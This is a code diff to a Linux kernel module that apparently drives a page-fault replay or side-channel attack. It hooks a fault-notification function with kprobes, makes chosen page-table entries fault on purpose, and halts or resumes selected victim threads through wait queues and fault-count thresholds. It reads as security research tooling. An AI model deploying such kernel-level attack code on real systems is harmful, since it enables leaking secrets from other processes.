@@ -65,10 +65,12 @@ static uint64_t fault_cnt = 0, fault_fault_cnt = 0;
 // APA variables
 static struct nuke_info_t special;
 static struct nuke_info_t *nuke_info_head = NULL;
-static uint8_t monitoring = 0, hijack_done = 0, hijack_start = 0, resume_hijacked_thread = 0, last_iteration = 0;
+static uint8_t monitoring = 0, hijack_done = 0, resume_hijacked_thread = 0, last_iteration = 0;
 static int thread_count = 0, join_count = 0;
 static DEFINE_SPINLOCK(lock_for_waiting);
 static DECLARE_WAIT_QUEUE_HEAD(waiting_wait_queue);
+
+static pid_t max_pid;
 static uint8_t counter[3];
 static uint8_t halted = 0;
 
@@ -96,22 +98,6 @@ static int device_release(struct inode *inode, struct file *file)
 	Device_Open--;
 
 	module_put(THIS_MODULE);
-	return 0;
-}
-
-static int check_condition(int my_thread_id)
-{
-	if (hijack_done == 1) { // finished hijack
-		pr_info("Magic batch to happened on last thread, releasing thread %d\n", my_thread_id);
-		return 1;
-	}
-
-	if (hijack_start == 1 && my_thread_id == 1) { // I am the thread to be hijacked
-		pr_info("Letting thread %d continue\n", my_thread_id);
-		hijack_start = 0;
-		return 1;
-	}
-
 	return 0;
 }
 
@@ -169,29 +155,19 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
 		clean_up_stored_addresses(&nuke_info_head);
 		break;
 
-	case WAIT:
+	case WAIT:	// unused now
 		spin_lock(&lock_for_waiting);
 		thread_count++;
 		my_thread_id = thread_count; // indexes start from 1
 		spin_unlock(&lock_for_waiting);
-
-		// msleep(1000); // wait for all threads to be launched
-		// wait_event_interruptible(waiting_wait_queue, check_condition(my_thread_id) == 1);
-		// pr_info("I have been woken up!\n");
 		break;
 
 	case JOIN:
 		pr_info("Called hijacked pthread join\n");
 
-		// when the first join happens, it means that all threads have been launched
-		if (join_count == 0) {
-			hijack_start = 1;
-			wake_up(&waiting_wait_queue);
-		}
-
 		// If all threads have called join that means that only the hijacked thread remains
 		join_count += 1; // indexes start from 1
-		if (join_count == thread_count) {
+		if (join_count == 3) {
 			pr_info("n-1 threads finished. Resuming last thread for one more iteration\n");
 			last_iteration = 1;
 			monitoring = 1;
@@ -335,7 +311,7 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 	pte_t pte, temp_pte, *faulting_pte;
 	faulting_pte = (pte_t *)regs->di; // get arg from notify_attack
 	pte = *faulting_pte;
-	pid_t tid;
+	pid_t tid = current->pid;
 
 	if (faulting_pte) {
 
@@ -363,14 +339,16 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 					arbitrarily_cause_page_fault(&(special.nuke_pte), special.nuke_virtual_addr);
 
 					// Halt this thread
-					if (halted < 2 && counter[0] && counter[1] && counter[2]) {
+					if (halted < 2 && counter[0] && counter[1] && counter[2] && tid < max_pid) {
 						pr_info("Halting thread\n");
 						halted += 1;
-						msleep(18000);
+						fault_cnt = 0;
+						wait_event_interruptible(waiting_wait_queue, hijack_done == 1);
+						pr_info("I have been woken up!\n");
 					}
 
 					// Check threshold
-					if (0 && last_iteration == 0 && fault_cnt > 24) {
+					if (last_iteration == 0 && fault_cnt > 24) {
 						monitoring = 0;
 						hijack_done = 1;
 						wake_up(&waiting_wait_queue);
@@ -394,11 +372,12 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 						}
 
 						// Wait until ready to resume
-						// wait_event_interruptible(waiting_wait_queue, resume_hijacked_thread == 1);
+						wait_event_interruptible(waiting_wait_queue, resume_hijacked_thread == 1);
+						pr_info("Now hijacked thread is resuming too!\n");
 						//uint64_t junk = 0;
 						//for (junk = 0; junk < 494967295; junk++) {;}
 						//pr_info("Done sleeping\n");
-						msleep(3000);
+						// msleep(3000);
 					}
 				}
 
@@ -408,7 +387,8 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 				if (!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
 
 					// Count thread
-					tid = current->pid;
+					if (tid > max_pid)
+						max_pid = tid;
 					counter[tid % 3] += 1;
 
 					// Reset counter
